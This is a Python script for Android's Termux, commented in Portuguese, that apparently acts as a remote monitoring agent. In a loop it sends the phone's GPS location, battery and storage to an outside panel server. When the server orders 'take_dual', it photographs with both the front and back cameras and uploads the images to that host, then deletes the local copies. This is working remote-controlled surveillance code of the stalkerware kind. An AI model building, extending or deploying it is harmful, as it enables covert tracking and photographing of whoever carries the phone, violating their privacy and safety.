import time
import subprocess
import json
import requests
import os
import uuid
import base64

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_CAM = "https://nexos-panel.onrender.com/api/upload_camera"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")

# Usar arquivos SEPARADOS para cada câmera
ARQUIVO_FOTO_FRONTAL = os.path.expanduser("~/nexos_frontal.jpg")
ARQUIVO_FOTO_TRASEIRA = os.path.expanduser("~/nexos_traseira.jpg")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*45)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*45 + "\n")

ultima_lat_valida = -16.6869
ultima_lon_valida = -49.2648
headers_json = {"Content-Type": "application/json"}

def capturar_e_enviar_foto(numero_camera, tipo, arquivo_destino):
    """Função dedicada para capturar uma câmera específica"""
    print(f"📸 Tentando capturar câmera {numero_camera} ({tipo})...")
    
    # Remove arquivo anterior se existir
    if os.path.exists(arquivo_destino):
        os.remove(arquivo_destino)
    
    # Comando específico para cada câmera
    cmd = f"termux-camera-photo -c {numero_camera} {arquivo_destino}"
    print(f"🔧 Executando: {cmd}")
    
    resultado = run_command(cmd)
    print(f"📋 Resultado do comando: {resultado}")
    
    # Aguarda a câmera processar
    time.sleep(2)
    
    # Verifica se o arquivo foi criado
    if os.path.exists(arquivo_destino):
        tamanho = os.path.getsize(arquivo_destino)
        print(f"✅ Arquivo criado: {arquivo_destino} ({tamanho} bytes)")
        
        if tamanho > 0:
            try:
                with open(arquivo_destino, "rb") as img_file:
                    foto_b64 = base64.b64encode(img_file.read()).decode('utf-8')
                
                payload = {
                    "device_id": DEVICE_ID,
                    "tipo": tipo,
                    "photo": foto_b64
                }
                
                print(f"📤 Enviando foto {tipo} para o servidor...")
                response = requests.post(
                    URL_UPLOAD_CAM, 
                    data=json.dumps(payload), 
                    headers=headers_json, 
                    timeout=15
                )
                
                if response.status_code == 200:
                    print(f"🚀 -> Lente {tipo.upper()} enviada com sucesso!")
                    return True
                else:
                    print(f"❌ Erro no upload: {response.status_code} - {response.text}")
                    return False
                    
            except Exception as e:
                print(f"❌ Erro ao processar foto {tipo}: {e}")
                return False
        else:
            print(f"❌ Arquivo vazio: {arquivo_destino}")
            return False
    else:
        print(f"❌ Arquivo não foi criado: {arquivo_destino}")
        return False

while True:
    # ... [código de bateria, storage, GPS - mantido igual] ...
    
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    lat, lon = ultima_lat_valida, ultima_lon_valida
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            if loc_data.get("latitude") and loc_data.get("longitude"):
                lat = loc_data.get("latitude")
                lon = loc_data.get("longitude")
                ultima_lat_valida = lat
                ultima_lon_valida = lon
        except: pass

    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon
    }

    try:
        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=5)
        if response.status_code == 200:
            res_data = response.json()
            comando_cam = str(res_data.get("comando_cam", "wait")).lower()
            
            print(f"🛰️ [OK] GPS Sincronizado. Ordem pendente: {comando_cam.upper()}")
            
            if comando_cam == "take_dual":
                print("📸 [AÇÃO] INICIANDO CAPTURA SEQUENCIAL DAS DUAS LENTES...")
                
                # Captura a traseira primeiro (câmera 0)
                sucesso_tras = capturar_e_enviar_foto(0, "back", ARQUIVO_FOTO_TRASEIRA)
                
                # Aguarda um pouco entre as capturas
                time.sleep(3)
                
                # Captura a frontal (câmera 1)
                sucesso_front = capturar_e_enviar_foto(1, "front", ARQUIVO_FOTO_FRONTAL)
                
                # Limpeza
                for arquivo in [ARQUIVO_FOTO_FRONTAL, ARQUIVO_FOTO_TRASEIRA]:
                    if os.path.exists(arquivo):
                        os.remove(arquivo)
                
                if sucesso_tras and sucesso_front:
                    print("🎯 [FIM] Captura dupla concluída com sucesso!")
                else:
                    print(f"⚠️ [FIM] Captura parcial - Frontal: {sucesso_front}, Traseira: {sucesso_tras}")
                    
    except Exception as e:
        print(f"⚠️ Alerta: {e}")

    time.sleep(2.0)
